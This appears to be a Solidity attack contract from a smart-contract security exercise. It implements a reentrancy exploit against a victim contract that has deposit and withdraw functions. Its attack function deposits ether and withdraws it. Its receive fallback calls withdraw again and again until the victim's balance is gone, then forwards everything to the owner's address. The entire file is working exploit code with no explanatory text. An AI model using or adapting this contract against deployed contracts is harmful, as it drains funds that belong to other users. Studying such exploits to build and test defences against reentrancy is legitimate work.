// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "../contracts/interfaces/IVictimContract.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackerContract is Ownable {

  IVictimContract private immutable victimContract;
  address payable private attackerAddress;
  address private contractAddress;

  constructor(address _victimContractAddress) {
    victimContract = IVictimContract(_victimContractAddress);
    attackerAddress = payable(owner());
    contractAddress = address(this);
  }

  function attack() external payable onlyOwner {
    victimContract.deposit{ value: msg.value }();
    victimContract.withdraw();
  }

  receive() external payable {
    if (address(victimContract).balance > 0) {
      victimContract.withdraw();
    } 
    else {
      attackerAddress.transfer(contractAddress.balance);
    }
  }
}